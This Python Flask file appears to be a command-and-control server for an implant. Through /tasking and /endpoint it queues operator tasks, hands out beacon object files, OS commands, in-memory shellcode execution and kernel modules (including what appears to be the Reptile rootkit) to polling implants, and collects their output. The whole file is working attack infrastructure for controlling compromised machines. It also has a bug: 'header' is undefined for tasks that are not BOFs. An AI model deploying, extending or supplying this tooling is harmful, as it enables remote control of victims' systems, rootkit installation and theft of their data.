from flask import Flask
from flask import request
from flask import send_from_directory
import base64
import json
import binascii
from struct import pack, calcsize
from collections import deque
import secrets

app = Flask(__name__)

bofsRootDir = "/bofs/"

"""
Structure of tasks (running simple BOF):
cmdData0 = {
	"header" : "inline:z",
	"name" : "bof:uname",
	"argv" : "-r",
};

Structure of tasks (running BOF and passing the buffer content to it):
cmdData1 = {
	"header" : "thread:zb",
	"name" : "bof:udpScanner",
	"argv" : "8.8.8.8:53",
	"buffer" : "file:udpPayloads.txt",
};

Structure of tasks (running BOF ):
cmdData0 = {
	"header" : "callback:",
	"name" : "bof:kernelModLoader",
};

Structure of tasks (running OS commands):
cmdData2 = {
	"header" : "inline:z",
	"name" : "cmd:ls",
	"argv" : "-al",
};

Structure of tasks (running shellcodes):
cmdData3 = {
	"header" : "inline:b",
	"name" : "bin:memfdExecute",
	"buffer" : "file:executableToUpload.exe",
};

Structure of tasks (running kernel modules):
cmdData4 = {
	"header" : "inline:z",
	"name" : "mod:reptile",
	"argv" : "start",
};
"""

# Fifo queue of tasks to execute by implant
# POST request to /tasking endpoint adds (appendLeft) a new task to it
# GET request to /endpoint endpoint pops a task (if available) from it and starts processing it
TaskFifo = deque()

# Repositories of tasks' input data (sent from operator) and tasks' output data (sent back from implant)
# stored under reqID keys 
InputDict = dict()
OutputDict = dict()

@app.route("/")
def main_page():
    return "<p>bofs repository</p>"

@app.route("/tasking", methods=['GET', 'POST'])
def addTask():

    if request.method == 'POST' and request.is_json:
        reqData = request.get_json()
        # add unique ID to the task
        reqData['id'] = secrets.token_hex()
        # convert JSON request to string and append it to task FIFO
        data = json.dumps(reqData)
        TaskFifo.appendleft(data) 
        return "<p>Consumed</p>"


    # handle GET:
    resp = []
    resp.append("<p>Pending tasks queue:</p>")

    for task in TaskFifo:
        resp.append(task + '<br/>')

    resp.append("<p>Tasks history:</p>")

    for key, value in InputDict.items():
        if key in OutputDict:
            resp.append(value + '<br/>')
            resp.append(OutputDict[key].decode('utf-8') + '<br/><br/>')
    
    str_out = ''.join(resp)
    return str_out

# GET /endpoint - check if task is available
# POST /endpoint - send in task's output data
@app.route("/endpoint", methods=['GET', 'POST'])
def heartbeat():

    # get implant's output data and add it to the output's store under 'reqID' key
    if request.method == 'POST':
        reqID = request.headers.get('Authorization')
        data = base64.b64decode(request.get_data())
        OutputDict[reqID] = data
        return ""

    # abort, if there are no tasks to process
    if len(TaskFifo) == 0:
        return "nothing to do"

    # get implant's identification data encoded in 'Authorization' header
    authz = base64.b64decode(request.headers.get('Authorization')).decode('utf-8')
    if not authz:
        return "go away"

    arch, os = authz.split(':')
    if arch == "x86_64":
        arch = "x64"
    if os == "windows":
        os = "coff"
    else:
        os = "elf"

    # get tasking data from TaskFifo and prepare for processing it
    data = TaskFifo.pop()
    cmdData = json.loads(data) # deserialize to JSON

    # check for required fields (name, header, id)
    if cmdData['name'] == "" or cmdData['header'] == "" or cmdData['id'] == "":
        return "say what?"

    # request ID for identifying requests (task input data) with responses (tasks output)
    reqID = cmdData['id']

    # store task's input data for logging purposes
    InputDict[reqID] = data

    # Based on task's input data (cmdData), prepare an implant's instruction (Instruction) for execution 
    Instruction = {
        "id": reqID,
        "name": cmdData['name'],
    }

    # we're dealing with BOF execution task, so let's:
    # 1. prepare path/URI for the BOF in case when downloading it will be needed
    # 2. calculate requested BOF's hash
    # 3. add bof_hash to the header field
    # 4. if 'persist' is in the header, put it at the last field of the header
    if 'bof:' in cmdData['name']:
        # prepare instruction's: 'path' field for bofs
        _, name = cmdData['name'].split(':')
        bofHttpPath = bofsRootDir + name + "." + os + "." + arch + ".o"
        Instruction['path'] = bofHttpPath
        bofLocalPath = bofHttpPath.lstrip('/')

        # calculate BOF's hash
        with open(bofLocalPath, 'rb') as f:
            bof_hash = format(abs(hash(f.read())), 'x')

        header = cmdData['header']
        if 'persist' in header:
            # replace 'persist' for bof_hash in header and then append 'persist'
            header = header.replace("persist", bof_hash)
            Instruction['header'] = header + ":persist"
        else:
            # append hash to the header:
            Instruction['header'] = header + ":" + bof_hash

    # get args specification possible values: iszZb
    args_spec = header.split(':')[1]

    # skip further processing with no arguments were provided
    if args_spec == "":
        return Instruction 

    if 'argv' not in cmdData:
        return Instruction 

    # prepare cmdData/Instruction for BOF-stager by iterating over 'argv' and inspecting args_spec
    argv = cmdData['argv'].split(' ')
    new_argv = ""
    i = 0
    buf_number = 0

    if len(argv) != len(args_spec):
        print("argv and args_spec mismatched length!")

    while i < len(argv):
        print(argv[i])
        print(args_spec[i])
        
        if len(new_argv) > 0:
            new_argv += " "

        # zero-terminated string
        if args_spec[i] == 'z':
            argv[i] = "z:" + argv[i]
            new_argv += argv[i]
        # integer
        elif args_spec[i] == 'i':
            argv[i] = "i:" + argv[i]
            new_argv += argv[i]
        # short integer
        elif args_spec[i] == 's':
            argv[i] = "s:" + argv[i]
            new_argv += argv[i]
        elif args_spec[i] == 'b':
            # prepare Instruction's field name
            field_name = "buffer" + str(buf_number)
            buf_number += 1
 
            # prepare Instruction's field content
            if 'file:' in argv[i]:
                _, path = argv[i].split(':')
                with open(path, 'rb') as f:
                    Instruction[field_name] = base64.b64encode(f.read()).decode('utf-8')
            else:
                # field is expected to be already base64 encoded
                Instruction[field_name] = argv[i]

            new_argv += str(field_name)

        i += 1

    print("new_argv: " + new_argv)

    # glue together all argv[i]'s and base64 encode it before sending
    Instruction['argv'] = base64.b64encode(new_argv.encode('utf-8')).decode('utf-8')

    # return Implant's Instruction for execution
    return Instruction 

@app.route(bofsRootDir + '<path:path>')
def send_report(path):
    return send_from_directory('bofs', path, mimetype='application/octet-stream')

if __name__ == '__main__':
    app.run(host='127.0.0.1',port=8000,debug=True)
